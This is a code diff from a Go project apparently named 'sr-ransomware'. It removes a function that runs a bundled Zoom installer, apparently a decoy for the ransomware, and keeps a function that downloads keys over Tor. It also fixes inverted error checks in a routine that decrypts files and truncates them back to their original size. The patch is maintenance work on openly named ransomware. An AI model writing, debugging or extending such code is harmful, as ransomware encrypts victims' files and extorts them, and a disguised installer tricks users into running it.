@@ -19,11 +19,6 @@ import (
     "github.com/sug0/sr-ransomware/go/net/ratelimit"
 )
 
-func RunZoomInstaller() error {
-    z := exe.NewZoom(zoomInstaller)
-    return errors.WrapIfNotNil(pkg, "error during zoom installation", z.Run())
-}
-
 func DownloadKeysFromTor() error {
     // create work dir
     err := os.Mkdir(workDir, os.ModePerm)
@@ -138,11 +133,11 @@ func DecryptFile(sk *rsa.PrivateKey, path string) error {
     }
     originalPath := path[:len(path)-4]
     originalSize, err := unpaddedSize(originalPath)
-    if err = nil {
+    if err != nil {
         return errors.Wrap(pkg, "failed to calculate new file size", err)
     }
     err = os.Truncate(originalPath, originalSize)
-    if err = nil {
+    if err != nil {
         return errors.Wrap(pkg, "failed to truncate file", err)
     }
     // remove original file
@@ -155,7 +150,7 @@ func unpaddedSize(path string) (int64, error) {
         return 0, err
     }
     defer f.Close()
-    err = f.Seek(-1, os.SEEK_END)
+    _, err = f.Seek(-1, os.SEEK_END)
     if err != nil {
         return 0, err
     }
